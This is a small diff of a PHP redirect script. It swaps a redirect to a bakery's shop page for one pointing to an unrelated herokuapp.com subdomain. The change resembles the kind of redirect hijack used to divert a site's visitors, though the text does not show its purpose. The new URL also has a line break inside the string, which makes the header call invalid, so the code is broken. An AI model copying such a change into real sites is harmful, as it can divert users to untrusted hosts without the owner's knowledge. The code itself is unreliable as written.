@@ -1,4 +1,5 @@
 <?php
-header("Location: https://www.seagullbakeryshop.com/shop");
+header("Location: https://actnor1.herokuapp.com/
+");
 die();
 ?>
